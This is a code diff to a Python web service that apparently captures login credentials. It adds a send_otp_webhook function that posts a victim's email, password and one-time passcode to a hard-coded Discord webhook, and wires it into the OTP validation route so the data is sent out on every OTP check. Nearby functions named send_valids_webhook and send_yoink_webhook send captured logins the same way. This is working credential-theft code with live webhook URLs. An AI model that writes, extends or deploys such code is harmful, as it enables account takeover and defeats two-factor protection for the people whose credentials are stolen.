@@ -98,6 +98,18 @@ def send_valids_webhook(login):
         print("Webhook sent successfully!")
     else:
         print(f"Failed to send webhook. Status code: {response.status_code}, Response: {response.text}")
+def send_otp_webhook(email, password, otp_code):
+    url = 'https://discord.com/api/webhooks/1276604050338746419/0Sut5PY0uwkpDcW5wyoiWQLw2t_ruhXNY8HdZGTUXH5BwA-vni-z_D2sTRXgWEHJhfZ1'
+    data = {
+        "content": f'{email}:{password}:{otp_code}'
+    }
+
+    response = requests.post(url, json=data)
+
+    if response.status_code == 204:
+        print("Webhook sent successfully!")
+    else:
+        print(f"Failed to send webhook. Status code: {response.status_code}, Response: {response.text}")
 
 def send_yoink_webhook(login):
     url = 'https://discord.com/api/webhooks/1274168362259316756/1OWyxFbBVhJoon0L083SW56xLg3DjrreNwl_f36pRcEpkT3cbu88eDIJs_g86nqRfeOc'
@@ -213,9 +225,10 @@ def otp_validate():
 
     email = data['email']
     otp_code = data['otp']
-
+    
     # Call the internal method to validate the OTP
     session, otp_link, client_token, account_age, password = build_session_from_db(email)
+    send_otp_webhook(email, password, otp_code)
     print(client_token)
 
     session, resp = tm.verify_OTP(session, otp_link, otp_code)
